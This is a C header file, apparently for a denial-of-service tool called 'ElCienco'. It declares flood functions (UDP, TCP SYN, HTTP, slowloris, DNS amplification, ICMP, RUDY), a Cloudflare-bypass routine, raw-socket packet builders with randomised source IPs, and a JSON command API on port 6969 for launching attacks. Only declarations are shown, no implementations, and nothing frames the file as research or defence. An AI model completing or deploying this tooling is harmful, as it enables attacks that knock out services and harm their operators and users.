#ifndef ELCIENCO_H
#define ELCIENCO_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <errno.h>
#include <signal.h>

#define MAX_THREADS 2048
#define MAX_PACKET_SIZE 65535
#define API_PORT 6969
#define BUFFER_SIZE 4096

typedef struct {
    char target[256];
    int port;
    int threads;
    int duration;
    int method; // 0=UDP, 1=TCP, 2=HTTP, 3=SLOW, 4=DNS, 5=ICMP, 6=RUDY, 7=CFBYPASS
} AttackConfig;

typedef struct {
    AttackConfig config;
    pthread_t thread_id;
    int thread_num;
    volatile int *running;
} ThreadData;

// Core attack functions
void *udp_flood(void *arg);
void *tcp_syn_flood(void *arg);
void *http_flood(void *arg);
void *slowloris_attack(void *arg);
void *dns_amplification(void *arg);
void *icmp_flood(void *arg);
void *rudyloris_attack(void *arg);
void *cloudflare_bypass(void *arg);

// API functions
void *api_server(void *arg);
void handle_api_request(int client_fd);
void parse_json_command(char *json, AttackConfig *config);

// Utility functions
int create_raw_socket(void);
int create_tcp_socket(void);
int create_udp_socket(void);
unsigned short checksum(void *b, int len);
void random_ip(char *ip_buffer);
void build_udp_packet(char *packet, char *src_ip, char *dst_ip, int src_port, int dst_port);
void build_tcp_syn_packet(char *packet, char *src_ip, char *dst_ip, int src_port, int dst_port);

#endif
